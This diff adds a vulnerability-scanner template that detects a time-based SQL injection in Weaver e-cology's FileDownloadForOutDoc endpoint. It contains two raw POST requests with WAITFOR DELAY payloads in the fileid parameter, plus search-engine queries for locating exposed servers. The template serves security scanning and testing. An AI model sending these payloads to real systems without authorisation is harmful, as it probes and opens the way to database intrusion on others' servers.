@@ -1,0 +1,46 @@
+id: ecology-oa-file-sqli
+
+info:
+  name: E-cology FileDownloadForOutDocSQL - SQL Injection
+  author: momika233
+  severity: high
+  description: |
+    e-cology did not effectively filter the user input, but directly spliced it into the SQL query statement, resulting in SQL injection vulnerabilities in the system
+  reference:
+    - https://github.com/TgHook/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA%20e-cology%20FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: weaver
+    product: e-cology
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+  tags: time-based-sqli,ecology,ecology-oa,sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+        Host: {{Hostname}}
+
+        isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:7'
+      - |
+        @timeout: 35s
+        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+        Host: {{Hostname}}
+
+        isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:15'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=7 && status_code_1 == 200'
+          - 'contains(header_1, "ecology_JSessionid=")'
+          - 'duration_2>=15 && status_code_2 == 200'
+          - 'contains(header_2, "ecology_JSessionid=")'
+        condition: and
+# digest: 4a0a0047304502200e80d90c1f7cbd27d1d5784c5f9500c35980df15a4a283254cbffb5f13ab05f50221008392c0a5c40a346e9dfd8cb29dcd970e943ca2f1fc5c177efbe6190a382e9b6b:922c64590222798bb761d5b6d8e72950
